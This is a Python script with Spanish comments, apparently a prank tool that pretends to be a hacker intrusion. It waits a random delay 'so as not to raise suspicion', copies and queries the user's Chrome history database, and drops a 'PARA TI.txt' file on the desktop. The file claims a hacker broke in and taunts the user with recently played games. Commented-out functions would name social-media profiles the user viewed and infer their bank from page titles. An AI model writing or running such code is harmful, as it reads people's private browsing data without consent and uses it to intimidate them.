import os
import sqlite3
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import glob

HACKER_FILE_NAME = "PARA TI.txt"

def get_user_path():
    return "{}/".format(Path.home())

def check_steam_games(hacker_file):
    steam_path = "C:\\Program Files (x86)\\Juegos\\*"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        games.append(game_path.split("\\")[-1])
    hacker_file.write("\nHe visto que has estado jugando ultimamente a {}... jajajaja...".format(", ".join(games[:3])))



def delay_action():
    n_hours = randrange(1, 4)
    n_minutes = randrange(1, 60)
    print("Durmiendo {} horas y {} minutos".format(n_hours, n_minutes))
    #seconds = (n_hours * 60 * 60) + (n_minutes * 60)
    seconds = 3
    sleep(seconds)

def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.")
    return hacker_file
def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...")
            sleep(3)

#def  check_twitter_and_scare_profile(hacker_file,chrome_history):
    #profiles_visited = []
    #for item in chrome_history[:10]:
        #results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        #if results and results[0] not in ["notifications", "home"]:
            #profiles_visited.append(results[0])
        #hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))

#def check_youtube_channels(hacker_file,chrome_history):
    #channels_visited = []
    #for item in chrome_history:
        #results = re.findall("https://youtube.com/@([A-Za-z0-9]+)$", item[2])
        #if results and results[0] not in ["notificacions", "home"] and results[0] not in channels_visited:
            #channels_visited.append(results[0])
        #hacker_file.write("He visto que has estado husmeando en los canales de {}...".format(",".join(channels_visited)))

"""def check_Facebook_profile(hacker_file,chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://facebook.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notificacions", "home"] and results[0] not in profiles_visited:
            profiles_visited.append(results[0])
        hacker_file.write("\nHe visto que has estado husmeando en los perfiles de {}...".format(",".join(profiles_visited)))"""


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "Caixa Bank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    hacker_file.write("\nAdemas veo que guardas el dinero en {}... Interesante".format(his_bank))

def main():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    delay_action()
    # Calculamos la ruta del usuario de Windows
    user_path = get_user_path()
    # Recogemos su historial de Google Chrome, cuando sea posible...
    chrome_history = get_chrome_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Escribiendo mensajes de miedo por canales de youtube, facebook y twitter
    #check_Facebook_profile(hacker_file,chrome_history)
    # El banco
    #check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)



if __name__ == "__main__":
    main()